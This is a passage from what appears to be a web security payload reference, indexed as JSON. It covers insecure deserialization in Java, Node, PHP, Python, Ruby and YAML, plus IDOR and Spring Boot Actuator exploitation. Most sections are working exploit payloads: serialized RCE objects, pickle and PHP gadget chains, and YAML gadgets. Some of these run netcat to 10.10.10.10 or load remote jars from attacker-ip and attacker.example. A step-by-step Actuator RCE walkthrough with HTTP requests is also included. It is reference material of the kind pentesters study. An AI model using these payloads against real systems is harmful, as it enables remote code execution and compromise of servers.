@pwntester, @cschneider4711            bsh:2.0b5                                                                                                                                                                                           \nC3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11                                                                                                                                                           \nClick1              @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0                                                                                                                                                         \nClojure             @JackOfMostTrades                      clojure:1.8.0                                                                                                                                                                                       \nCommonsBeanutils1   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                                                                                               \nCommonsCollections1 @frohoff                               commons-collections:3.1                                                                                                                                                                             \nCommonsCollections2 @frohoff                               commons-collections4:4.0                                                                                                                                                                            \nCommonsCollections3 @frohoff                               commons-collections:3.1                                                                                                                                                                             \nCommonsCollections4 @frohoff                               commons-collections4:4.0                                                                                                                                                                            \nCommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1                                                                                                                                                                             \nCommonsCollections6 @matthias_kaiser                       commons-collections:3.1                                                                                                                                                                             \nCommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1                                                                                                                                                                             \nFileUpload1         @mbechler                              commons-fileupload:1.3.1, commons-io:2.4\nGroovy1             @frohoff                               groovy:2.3.9                                                                                                                                                                                        \nHibernate1          @mbechler                                                                                                                                                                                                                                  \nHibernate2          @mbechler                                                                                                                                                                                                                                  \nJBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                            \nJRMPClient          @mbechler                                                                                                                                                                                                                                  \nJRMPListener        @mbechler                                                                                                                                                                                                                                  \nJSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1\nJavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                                        \nJdk7u21             @frohoff                                                                                                                                                                                                                                   \nJython1             @pwntester, @cschneider4711            jython-standalone:2.5.2                                                                                                                                                                             \nMozillaRhino1       @matthias_kaiser                       js:1.7R2                                                                                                                                                                                            \nMozillaRhino2       @_tint0                                js:1.7R2                                                                                                                                                                                            \nMyfaces1            @mbechler                                                                                                                                                                                                                                  \nMyfaces2            @mbechler                                                                                                                                                                                                                                  \nROME                @mbechler                              rome:1.0                                                                                                                                                                                            \nSpring1             @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE                                                                                                                                               \nSpring2             @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2                                                                                                           \nURLDNS              @gebl                                                                                                                                                                                                                                      \nVaadin1             @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14                                                                                                                                                          \nWicket1             @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4   \n</code></pre></p>"},{"location":"Insecure%20Deserialization/Java/#burp-extensions-using-ysoserial","title":"Burp extensions using ysoserial","text":"<ul> <li>JavaSerialKiller</li> <li>Java Deserialization Scanner</li> <li>Burp-ysoserial</li> <li>SuperSerial</li> <li>SuperSerial-Active</li> </ul>"},{"location":"Insecure%20Deserialization/Java/#alternative-tooling","title":"Alternative Tooling","text":"<ul> <li>pwntester/JRE8u20_RCE_Gadget</li> <li>joaomatosf/JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool</li> <li>pimps/ysoserial-modified</li> <li>NickstaDB/SerialBrute - Java serialization brute force attack tool</li> <li>NickstaDB/SerializationDumper - A tool to dump Java serialization streams in a more human readable form</li> <li>bishopfox/gadgetprobe</li> <li>mbechler/marshalsec - Turning your data into code execution</li> </ul> <pre><code>$ java -cp marshalsec.jar marshalsec.&lt;Marshaller&gt; [-a] [-v] [-t] [&lt;gadget_type&gt; [&lt;arguments...&gt;]]\n$ java -cp marshalsec.jar marshalsec.JsonIO Groovy \"cmd\" \"/c\" \"calc\"\n$ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\\#exploit.JNDIExploit 1389\n-a - generates/tests all payloads for that marshaller\n-t - runs in test mode, unmarshalling the generated payloads after generating them.\n-v - verbose mode, e.g. also shows the generated payload in test mode.\ngadget_type - Identifier of a specific gadget, if left out will display the available ones for that specific marshaller.\narguments - Gadget specific arguments\n</code></pre> <p>Payload generators for the following marshallers are included:</p> Marshaller Gadget Impact BlazeDSAMF(0|3|X) JDK only escalation to Java serializationvarious third party libraries RCEs Hessian|Burlap various third party RCEs Castor dependency library RCE Jackson possible JDK only RCE, various third party RCEs Java yet another third party RCE JsonIO JDK only RCE JYAML JDK only RCE Kryo third party RCEs KryoAltStrategy JDK only RCE Red5AMF(0|3) JDK only RCE SnakeYAML JDK only RCEs XStream JDK only RCEs YAMLBeans third party RCE"},{"location":"Insecure%20Deserialization/Java/#gadgets","title":"Gadgets","text":"<p>Require: * <code>java.io.Serializable</code></p>"},{"location":"Insecure%20Deserialization/Java/#references","title":"References","text":"<ul> <li>Github - ysoserial</li> <li>Triggering a DNS lookup using Java Deserialization - paranoidsoftware.com</li> <li>Detecting deserialization bugs with DNS exfiltration - Philippe Arteau | Mar 22, 2017</li> <li>Java-Deserialization-Cheat-Sheet - GrrrDog</li> <li>Understanding &amp; practicing java deserialization exploits</li> <li>How i found a 1500$ worth Deserialization vulnerability - @D0rkerDevil</li> <li>Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - 14 Aug 2017, Peter St\u00f6ckli</li> <li>Jackson CVE-2019-12384: anatomy of a vulnerability class</li> <li>On Jackson CVEs: Don\u2019t Panic \u2014 Here is what you need to know</li> <li>Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464) - Michael Stepankin / @artsploit - 29 June 2021</li> </ul>"},{"location":"Insecure%20Deserialization/Node/","title":"Node Deserialization","text":""},{"location":"Insecure%20Deserialization/Node/#summary","title":"Summary","text":"<ul> <li>Exploit<ul> <li>node-serialize</li> <li>funcster</li> </ul> </li> <li>References</li> </ul>"},{"location":"Insecure%20Deserialization/Node/#exploit","title":"Exploit","text":"<ul> <li>In Node source code, look for:<ul> <li><code>node-serialize</code></li> <li><code>serialize-to-js</code></li> <li><code>funcster</code></li> </ul> </li> </ul>"},{"location":"Insecure%20Deserialization/Node/#node-serialize","title":"node-serialize","text":"<p>An issue was discovered in the node-serialize package 0.0.4 for Node.js. Untrusted data passed into the <code>unserialize()</code> function can be exploited to achieve arbitrary code execution by passing a JavaScript Object with an Immediately Invoked Function Expression (IIFE).</p> <ol> <li>Generate a serialized payload     <pre><code>var y = {\nrce : function(){\nrequire('child_process').exec('ls /', function(error,\nstdout, stderr) { console.log(stdout) });\n},\n}\nvar serialize = require('node-serialize');\nconsole.log(\"Serialized: \\n\" + serialize.serialize(y));\n</code></pre></li> <li>Add bracket <code>()</code> to force the execution     <pre><code>{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()\"}\n</code></pre></li> <li>Send the payload</li> </ol>"},{"location":"Insecure%20Deserialization/Node/#funcster","title":"funcster","text":"<pre><code>{\"rce\":{\"__js_function\":\"function(){CMD=\\\"cmd /c calc\\\";const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').exec(CMD,function(error,stdout,stderr){console.log(stdout)});}()\"}}\n</code></pre>"},{"location":"Insecure%20Deserialization/Node/#references","title":"References","text":"<ul> <li>Exploiting Node.js deserialization bug for Remote Code Execution (CVE-2017-5941) - Ajin Abraham</li> <li>NodeJS Deserialization - 8 January 2020- gonczor</li> <li>CVE-2017-5941 - NATIONAL VULNERABILITY DATABASE - 02/09/2017</li> </ul>"},{"location":"Insecure%20Deserialization/PHP/","title":"PHP Deserialization","text":"<p>PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.</p> <p>The following magic methods will help you for a PHP Object injection</p> <ul> <li>__wakeup() when an object is unserialized.</li> <li>__destruct() when an object is deleted.</li> <li>__toString() when an object is converted to a string.</li> </ul> <p>Also you should check the <code>Wrapper Phar://</code> in File Inclusion which use a PHP object injection.</p>"},{"location":"Insecure%20Deserialization/PHP/#summary","title":"Summary","text":"<ul> <li>General concept</li> <li>Authentication bypass</li> <li>Object Injection</li> <li>Finding and using gadgets</li> <li>Phar Deserialization</li> <li>Real world examples</li> <li>References</li> </ul>"},{"location":"Insecure%20Deserialization/PHP/#general-concept","title":"General concept","text":"<p>Vulnerable code:</p> <pre><code>&lt;?php \nclass PHPObjectInjection{\npublic $inject;\nfunction __construct(){\n}\nfunction __wakeup(){\nif(isset($this-&gt;inject)){\neval($this-&gt;inject);\n}\n}\n}\nif(isset($_REQUEST['r'])){  \n$var1=unserialize($_REQUEST['r']);\nif(is_array($var1)){\necho \"&lt;br/&gt;\".$var1[0].\" - \".$var1[1];\n}\n}\nelse{\necho \"\"; # nothing happens here\n}\n?&gt;\n</code></pre> <p>Craft a payload using existing code inside the application.</p> <pre><code># Basic serialized data\na:2:{i:0;s:4:\"XVWA\";i:1;s:33:\"Xtreme Vulnerable Web Application\";}\n# Command execution\nstring(68) \"O:18:\"PHPObjectInjection\":1:{s:6:\"inject\";s:17:\"system('whoami');\";}\"\n</code></pre>"},{"location":"Insecure%20Deserialization/PHP/#authentication-bypass","title":"Authentication bypass","text":""},{"location":"Insecure%20Deserialization/PHP/#type-juggling","title":"Type juggling","text":"<p>Vulnerable code:</p> <pre><code>&lt;?php\n$data = unserialize($_COOKIE['auth']);\nif ($data['username'] == $adminName &amp;&amp; $data['password'] == $adminPassword) {\n$admin = true;\n} else {\n$admin = false;\n}\n</code></pre> <p>Payload:</p> <pre><code>a:2:{s:8:\"username\";b:1;s:8:\"password\";b:1;}\n</code></pre> <p>Because <code>true == \"str\"</code> is true.</p>"},{"location":"Insecure%20Deserialization/PHP/#object-injection","title":"Object Injection","text":"<p>Vulnerable code:</p> <pre><code>&lt;?php\nclass ObjectExample\n{\nvar $guess;\nvar $secretCode;\n}\n$obj = unserialize($_GET['input']);\nif($obj) {\n$obj-&gt;secretCode = rand(500000,999999);\nif($obj-&gt;guess === $obj-&gt;secretCode) {\necho \"Win\";\n}\n}\n?&gt;\n</code></pre> <p>Payload:</p> <pre><code>O:13:\"ObjectExample\":2:{s:10:\"secretCode\";N;s:5:\"guess\";R:2;}\n</code></pre> <p>We can do an array like this:</p> <pre><code>a:2:{s:10:\"admin_hash\";N;s:4:\"hmac\";R:2;}\n</code></pre>"},{"location":"Insecure%20Deserialization/PHP/#finding-and-using-gadgets","title":"Finding and using gadgets","text":"<p>Also called <code>\"PHP POP Chains\"</code>, they can be used to gain RCE on the system.</p> <ul> <li>In PHP source code, look for <code>unserialize()</code> function.</li> <li>Interesting Magic Methods such as <code>__construct()</code>, <code>__destruct()</code>, <code>__call()</code>, <code>__callStatic()</code>, <code>__get()</code>, <code>__set()</code>, <code>__isset()</code>, <code>__unset()</code>, <code>__sleep()</code>, <code>__wakeup()</code>, <code>__serialize()</code>, <code>__unserialize()</code>, <code>__toString()</code>, <code>__invoke()</code>, <code>__set_state()</code>, <code>__clone()</code>, and <code>__debugInfo()</code>:<ul> <li><code>__construct()</code>: PHP class constructor, is automatically called upon object creation</li> <li><code>__destruct()</code>: PHP class destructor, is automatically called when references to the object are removed from memory</li> <li><code>__toString()</code>: PHP call-back that gets executed if the object is treated like a string</li> <li><code>__wakeup()</code> PHP call-back that gets executed upon deserialization</li> </ul> </li> </ul> <p>ambionics/phpggc is a tool built to generate the payload based on several frameworks:</p> <ul> <li>Laravel</li> <li>Symfony</li> <li>SwiftMailer</li> <li>Monolog</li> <li>SlimPHP</li> <li>Doctrine</li> <li>Guzzle</li> </ul> <pre><code>phpggc monolog/rce1 'phpinfo();' -s\nphpggc monolog/rce1 assert 'phpinfo()'\nphpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data\nphpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini\n</code></pre>"},{"location":"Insecure%20Deserialization/PHP/#phar-deserialization","title":"Phar Deserialization","text":"<p>Using <code>phar://</code> wrapper, one can trigger a deserialization on the specified file like in <code>file_get_contents(\"phar://./archives/app.phar\")</code>.</p> <p>A valid PHAR includes four elements:</p> <ol> <li>Stub: The stub is a chunk of PHP code which is executed when the file is accessed in an executable context. At a minimum, the stub must contain <code>__HALT_COMPILER();</code> at its conclusion. Otherwise, there are no restrictions on the contents of a Phar stub.</li> <li>Manifest: Contains metadata about the archive and its contents.</li> <li>File Contents: Contains the actual files in the archive.</li> <li> <p>Signature(optional): For verifying archive integrity.</p> </li> <li> <p>Example of a Phar creation in order to exploit a custom <code>PDFGenerator</code>.     <pre><code>&lt;?php\nclass PDFGenerator { }\n//Create a new instance of the Dummy class and modify its property\n$dummy = new PDFGenerator();\n$dummy-&gt;callback = \"passthru\";\n$dummy-&gt;fileName = \"uname -a &gt; pwned\"; //our payload\n// Delete any existing PHAR archive with that name\n@unlink(\"poc.phar\");\n// Create a new archive\n$poc = new Phar(\"poc.phar\");\n// Add all write operations to a buffer, without modifying the archive on disk\n$poc-&gt;startBuffering();\n// Set the stub\n$poc-&gt;setStub(\"&lt;?php echo 'Here is the STUB!'; __HALT_COMPILER();\");\n/* Add a new file in the archive with \"text\" as its content*/\n$poc[\"file\"] = \"text\";\n// Add the dummy object to the metadata. This will be serialized\n$poc-&gt;setMetadata($dummy);\n// Stop buffering and write changes to disk\n$poc-&gt;stopBuffering();\n?&gt;\n</code></pre></p> </li> <li> <p>Example of a Phar creation with a <code>JPEG</code> magic byte header since there is no restriction on the content of stub.     <pre><code>&lt;?php\nclass AnyClass {\npublic $data = null;\npublic function __construct($data) {\n$this-&gt;data = $data;\n}\nfunction __destruct() {\nsystem($this-&gt;data);\n}\n}\n// create new Phar\n$phar = new Phar('test.phar');\n$phar-&gt;startBuffering();\n$phar-&gt;addFromString('test.txt', 'text');\n$phar-&gt;setStub(\"\\xff\\xd8\\xff\\n&lt;?php __HALT_COMPILER(); ?&gt;\");\n// add object of any class as meta data\n$object = new AnyClass('whoami');\n$phar-&gt;setMetadata($object);\n$phar-&gt;stopBuffering();\n</code></pre></p> </li> </ol>"},{"location":"Insecure%20Deserialization/PHP/#real-world-examples","title":"Real world examples","text":"<ul> <li>Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution Vulnerability - Steven Seeley</li> <li>Vanilla Forums Xenforo password splitHash Unserialize Remote Code Execution Vulnerability - Steven Seeley</li> <li>Vanilla Forums domGetImages getimagesize Unserialize Remote Code Execution Vulnerability (critical) - Steven Seeley</li> <li>Vanilla Forums Gdn_Format unserialize() Remote Code Execution Vulnerability - Steven Seeley</li> </ul>"},{"location":"Insecure%20Deserialization/PHP/#references","title":"References","text":"<ul> <li>PHP Object Injection - OWASP</li> <li>Utilizing Code Reuse/ROP in PHP</li> <li>PHP unserialize</li> <li>PHP Generic Gadget - ambionics security</li> <li>POC2009 Shocking News in PHP Exploitation</li> <li>PHP Internals Book - Serialization</li> <li>TSULOTT Web challenge write-up from MeePwn CTF 1st 2017 by Rawsec</li> <li>CTF writeup: PHP object injection in kaspersky CTF</li> <li>Jack The Ripper Web challeneg Write-up from ECSC 2019 Quals Team France by Rawsec</li> <li>Rusty Joomla RCE Unserialize overflow - Alessandro Groppo - October 3, 2019</li> <li>PHP Pop Chains - Achieving RCE with POP chain exploits. - Vickie Li - September 3, 2020</li> <li>How to exploit the PHAR Deserialization Vulnerability - Alexandru Postolache - May 29, 2020</li> <li>phar:// deserialization - HackTricks</li> <li>Finding PHP Serialization Gadget Chain - DG'hAck Unserial killer - Aug 11, 2022 - xanhacks</li> </ul>"},{"location":"Insecure%20Deserialization/Python/","title":"Python Deserialization","text":"<ul> <li>In Python source code, look for:<ul> <li><code>cPickle.loads</code></li> <li><code>pickle.loads</code></li> <li><code>_pickle.loads</code></li> <li><code>jsonpickle.decode</code></li> </ul> </li> </ul>"},{"location":"Insecure%20Deserialization/Python/#pickle","title":"Pickle","text":"<p>The following code is a simple example of using <code>cPickle</code> in order to generate an auth_token which is a serialized User object.  <code>import cPickle</code> will only work on Python 2</p> <pre><code>import cPickle\nfrom base64 import b64encode, b64decode\nclass User:\ndef __init__(self):\nself.username = \"anonymous\"\nself.password = \"anonymous\"\nself.rank     = \"guest\"\nh = User()\nauth_token = b64encode(cPickle.dumps(h))\nprint(\"Your Auth Token : {}\").format(auth_token)\n</code></pre> <p>The vulnerability is introduced when a token is loaded from an user input. </p> <pre><code>new_token = raw_input(\"New Auth Token : \")\ntoken = cPickle.loads(b64decode(new_token))\nprint \"Welcome {}\".format(token.username)\n</code></pre> <p>Python 2.7 documentation clearly states Pickle should never be used with untrusted sources. Let's create a malicious data that will execute arbitrary code on the server.</p> <p>The pickle module is not secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.</p> <pre><code>import cPickle, os\nfrom base64 import b64encode, b64decode\nclass Evil(object):\ndef __reduce__(self):\nreturn (os.system,(\"whoami\",))\ne = Evil()\nevil_token = b64encode(cPickle.dumps(e))\nprint(\"Your Evil Token : {}\").format(evil_token)\n</code></pre>"},{"location":"Insecure%20Deserialization/Python/#references","title":"References","text":"<ul> <li>Exploiting misuse of Python's \"pickle\" - Mar 20, 2011</li> <li>Python Pickle Injection - Apr 30, 2017</li> </ul>"},{"location":"Insecure%20Deserialization/Ruby/","title":"Ruby Deserialization","text":""},{"location":"Insecure%20Deserialization/Ruby/#marshalload","title":"Marshal.load","text":"<p>Script to generate and verify the deserialization gadget chain against Ruby 2.0 through to 2.5</p> <pre><code>for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load([\"0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446\"].pack(\"H*\")) rescue nil'; done\n</code></pre>"},{"location":"Insecure%20Deserialization/Ruby/#yamlload","title":"Yaml.load","text":"<p>Vulnerable code <pre><code>require \"yaml\"\nYAML.load(File.read(\"p.yml\"))\n</code></pre></p> <p>Universal gadget for ruby &lt;= 2.7.2: <pre><code>--- !ruby/object:Gem::Requirement\nrequirements:\n!ruby/object:Gem::DependencyList\nspecs:\n- !ruby/object:Gem::Source::SpecificFile\nspec: &amp;1 !ruby/object:Gem::StubSpecification\nloaded_from: \"|id 1&gt;&amp;2\"\n- !ruby/object:Gem::Source::SpecificFile\nspec:\n</code></pre></p> <p>Universal gadget for ruby 2.x - 3.x.</p> <pre><code>---\n- !ruby/object:Gem::Installer\ni: x\n- !ruby/object:Gem::SpecFetcher\ni: y\n- !ruby/object:Gem::Requirement\nrequirements:\n!ruby/object:Gem::Package::TarReader\nio: &amp;1 !ruby/object:Net::BufferedIO\nio: &amp;1 !ruby/object:Gem::Package::TarReader::Entry\nread: 0\nheader: \"abc\"\ndebug_output: &amp;1 !ruby/object:Net::WriteAdapter\nsocket: &amp;1 !ruby/object:Gem::RequestSet\nsets: !ruby/object:Net::WriteAdapter\nsocket: !ruby/module 'Kernel'\nmethod_id: :system\ngit_set: id\nmethod_id: :resolve\n</code></pre>"},{"location":"Insecure%20Deserialization/Ruby/#references","title":"References","text":"<ul> <li>RUBY 2.X UNIVERSAL RCE DESERIALIZATION GADGET CHAIN - elttam, Luke Jahnke</li> <li>Universal RCE with Ruby YAML.load - @_staaldraad </li> <li>Online access to Ruby 2.x Universal RCE Deserialization Gadget Chain - PentesterLab</li> <li>Universal RCE with Ruby YAML.load (versions &gt; 2.7) - @_staaldraad</li> <li>Blind Remote Code Execution through YAML Deserialization - 09 JUNE 2021</li> </ul>"},{"location":"Insecure%20Deserialization/YAML/","title":"YAML Deserialization","text":""},{"location":"Insecure%20Deserialization/YAML/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Exploit<ul> <li>PyYAML</li> <li>ruamel.yaml</li> <li>Ruby</li> <li>SnakeYAML</li> </ul> </li> <li>References</li> </ul>"},{"location":"Insecure%20Deserialization/YAML/#tools","title":"Tools","text":"<ul> <li>j0lt-github/python-deserialization-attack-payload-generator</li> <li>artsploit/yaml-payload - A tiny project for generating SnakeYAML deserialization payloads</li> <li>mbechler/marshalsec</li> </ul>"},{"location":"Insecure%20Deserialization/YAML/#exploit","title":"Exploit","text":""},{"location":"Insecure%20Deserialization/YAML/#pyyaml","title":"PyYAML","text":"<pre><code>!!python/object/apply:time.sleep [10]\n!!python/object/apply:builtins.range [1, 10, 1]\n!!python/object/apply:os.system [\"nc 10.10.10.10 4242\"]\n!!python/object/apply:os.popen [\"nc 10.10.10.10 4242\"]\n!!python/object/new:subprocess [[\"ls\",\"-ail\"]]\n!!python/object/new:subprocess.check_output [[\"ls\",\"-ail\"]]\n</code></pre> <pre><code>!!python/object/apply:subprocess.Popen\n- ls\n</code></pre> <pre><code>!!python/object/new:str\nstate: !!python/tuple\n- 'print(getattr(open(\"flag\\x2etxt\"), \"read\")())'\n- !!python/object/new:Warning\nstate:\nupdate: !!python/name:exec\n</code></pre> <p>Since PyYaml version 6.0, the default loader for <code>load</code> has been switched to SafeLoader mitigating the risks against Remote Code Execution. PR fixing the vulnerabily</p> <p>The vulnerable sinks are now <code>yaml.unsafe_load</code> and <code>yaml.load(input, Loader=yaml.UnsafeLoader)</code></p> <pre><code>with open('exploit_unsafeloader.yml') as file:\n        data = yaml.load(file,Loader=yaml.UnsafeLoader)\n</code></pre>"},{"location":"Insecure%20Deserialization/YAML/#ruamelyaml","title":"Ruamel.yaml","text":""},{"location":"Insecure%20Deserialization/YAML/#ruby","title":"Ruby","text":"<pre><code> ---\n- !ruby/object:Gem::Installer\ni: x\n- !ruby/object:Gem::SpecFetcher\ni: y\n- !ruby/object:Gem::Requirement\nrequirements:\n!ruby/object:Gem::Package::TarReader\nio: &amp;1 !ruby/object:Net::BufferedIO\nio: &amp;1 !ruby/object:Gem::Package::TarReader::Entry\nread: 0\nheader: \"abc\"\ndebug_output: &amp;1 !ruby/object:Net::WriteAdapter\nsocket: &amp;1 !ruby/object:Gem::RequestSet\nsets: !ruby/object:Net::WriteAdapter\nsocket: !ruby/module 'Kernel'\nmethod_id: :system\ngit_set: sleep 600\nmethod_id: :resolve </code></pre>"},{"location":"Insecure%20Deserialization/YAML/#snakeyaml","title":"SnakeYAML","text":"<pre><code>!!javax.script.ScriptEngineManager [\n!!java.net.URLClassLoader [[\n!!java.net.URL [\"http://attacker-ip/\"]\n]]\n]\n</code></pre>"},{"location":"Insecure%20Deserialization/YAML/#references","title":"References","text":"<ul> <li>[Python Yaml Deserialization - hacktricks.xyz][https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization]</li> <li>[YAML Deserialization Attack in Python - Manmeet Singh &amp; Ashish Kukret - November 13][https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf]</li> <li>PyYAML Documentation</li> <li>Blind Remote Code Execution through YAML Deserialization - 09 JUNE 2021</li> <li>[CVE-2019-20477]- 0Day YAML Deserialization Attack on PyYAML version &lt;= 5.1.2 - @_j0lt</li> </ul>"},{"location":"Insecure%20Direct%20Object%20References/","title":"Insecure Direct Object References","text":"<p>Insecure Direct Object References occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability attackers can bypass authorization and access resources in the system directly, for example database records or files.  - OWASP</p>"},{"location":"Insecure%20Direct%20Object%20References/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Exploit<ul> <li>IDOR Tips</li> </ul> </li> <li>Examples</li> <li>References</li> </ul>"},{"location":"Insecure%20Direct%20Object%20References/#tools","title":"Tools","text":"<ul> <li>BApp Store &gt; Authz</li> <li>BApp Store &gt; AuthMatrix</li> <li>BApp Store &gt; Autorize</li> </ul>"},{"location":"Insecure%20Direct%20Object%20References/#exploit","title":"Exploit","text":"<p>The value of a parameter is used directly to retrieve a database record.</p> <pre><code>http://foo.bar/somepage?invoice=12345\n</code></pre> <p>The value of a parameter is used directly to perform an operation in the system</p> <pre><code>http://foo.bar/changepassword?user=someuser\n</code></pre> <p>The value of a parameter is used directly to retrieve a file system resource</p> <pre><code>http://foo.bar/showImage?img=img00011\n</code></pre> <p>The value of a parameter is used directly to access application functionality</p> <pre><code>http://foo.bar/accessPage?menuitem=12\n</code></pre>"},{"location":"Insecure%20Direct%20Object%20References/#idor-tips","title":"IDOR Tips","text":"<ul> <li>Change the HTTP request: POST \u2192 PUT</li> <li>Change the content type: XML \u2192 JSON</li> <li>Increment/decrement numerical values (1,2,3,..)</li> <li>GUID/UUID might be weak</li> <li>Transform numerical values to arrays: <code>{\"id\":19} \u2192 {\"id\":[19]}</code></li> </ul>"},{"location":"Insecure%20Direct%20Object%20References/#examples","title":"Examples","text":"<ul> <li>HackerOne - IDOR to view User Order Information - meals</li> <li>HackerOne - IDOR on HackerOne Feedback Review - japz</li> </ul>"},{"location":"Insecure%20Direct%20Object%20References/#labs","title":"Labs","text":"<ul> <li>Insecure direct object references</li> </ul>"},{"location":"Insecure%20Direct%20Object%20References/#references","title":"References","text":"<ul> <li>OWASP - Testing for Insecure Direct Object References (OTG-AUTHZ-004)</li> <li>OWASP - Insecure Direct Object Reference Prevention Cheat Sheet</li> <li>BUGCROWD - How-To: Find IDOR (Insecure Direct Object Reference) Vulnerabilities for large bounty rewards - Sam Houton</li> <li>IDOR tweet as any user by kedrisec</li> <li>Manipulation of ETH balance</li> <li>Viewing private Airbnb Messages </li> <li>Hunting Insecure Direct Object Reference Vulnerabilities for Fun and Profit (PART-1) - Mohammed Abdul Raheem - Feb 2, 2018</li> </ul>"},{"location":"Insecure%20Management%20Interface/","title":"Insecure Management Interface","text":""},{"location":"Insecure%20Management%20Interface/#springboot-actuator","title":"Springboot-Actuator","text":"<p>Actuator endpoints let you monitor and interact with your application.  Spring Boot includes a number of built-in endpoints and lets you add your own.  For example, the <code>/health</code> endpoint provides basic application health information. </p> <p>Some of them contains sensitive info such as :</p> <ul> <li><code>/trace</code> - Displays trace information (by default the last 100 HTTP requests with headers).</li> <li><code>/env</code> - Displays the current environment properties (from Spring\u2019s ConfigurableEnvironment).</li> <li><code>/heapdump</code> - Builds and returns a heap dump from the JVM used by our application.</li> <li><code>/dump</code> - Displays a dump of threads (including a stack trace).</li> <li><code>/logfile</code> - Outputs the contents of the log file.</li> <li><code>/mappings</code> - Shows all of the MVC controller mappings.</li> </ul> <p>These endpoints are enabled by default in Springboot 1.X. Note: Sensitive endpoints will require a username/password when they are accessed over HTTP.</p> <p>Since Springboot 2.X only <code>/health</code> and <code>/info</code> are enabled by default.</p>"},{"location":"Insecure%20Management%20Interface/#remote-code-execution-via-env","title":"Remote Code Execution via <code>/env</code>","text":"<p>Spring is able to load external configurations in the YAML format. The YAML config is parsed with the SnakeYAML library, which is susceptible to deserialization attacks. In other words, an attacker can gain remote code execution by loading a malicious config file.</p>"},{"location":"Insecure%20Management%20Interface/#steps","title":"Steps","text":"<ol> <li> <p>Generate a payload of SnakeYAML deserialization gadget.</p> </li> <li> <p>Build malicious jar <pre><code>git clone https://github.com/artsploit/yaml-payload.git\ncd yaml-payload\n# Edit the payload before executing the last commands (see below)\njavac src/artsploit/AwesomeScriptEngineFactory.java\njar -cvf yaml-payload.jar -C src/ .\n</code></pre></p> </li> <li> <p>Edit src/artsploit/AwesomeScriptEngineFactory.java</p> </li> </ol> <pre><code>public AwesomeScriptEngineFactory() {\ntry {\nRuntime.getRuntime().exec(\"ping rce.poc.attacker.example\"); // COMMAND HERE\n} catch (IOException e) {\ne.printStackTrace();\n}\n}\n</code></pre> <ul> <li>Create a malicious yaml config (yaml-payload.yml)</li> </ul> <pre><code>!!javax.script.ScriptEngineManager [\n!!java.net.URLClassLoader [[\n!!java.net.URL [\"http://attacker.example/yaml-payload.jar\"]\n]]\n]\n</code></pre> <ol> <li> <p>Host the malicious files on your server.</p> </li> <li> <p>yaml-payload.jar</p> </li> <li> <p>yaml-payload.yml</p> </li> <li> <p>Change <code>spring.cloud.bootstrap.location</code> to your server.</p> </li> </ol> <pre><code>POST /env HTTP/1.1\nHost: victim.example:8090\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 59\n\nspring.cloud.bootstrap.location=http://attacker.example/yaml-payload.yml\n</code></pre> <ol> <li>Reload the configuration.</li> </ol> <pre><code>POST /refresh HTTP/1.1\nHost: victim.example:8090\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\n</code></pre>"},{"location":"Insecure%20Management%20Interface/#references","title":"References","text":"<ul> <li>Springboot - Official Documentation</li> <li>Exploiting Spring Boot Actuators - Veracode</li> </ul>"},{"location":"Insecure%20Randomness/","title":"Insecure Randomness","text":""},{"location":"Insecure%20Randomness/#summary","title":"Summary","text":"<ul> <li>GUID / UUID<ul> <li>GUID Versions</li> <li>Tools</li> </ul> </li> <li>References</li> </ul>"},{"location":"Insecure%20Randomness/#guid-uuid","title":"GUID / UUID","text":""},{"location":"Insecure%20Randomness/#guid-versions","title":"GUID Versions","text":"<p>Version identification: 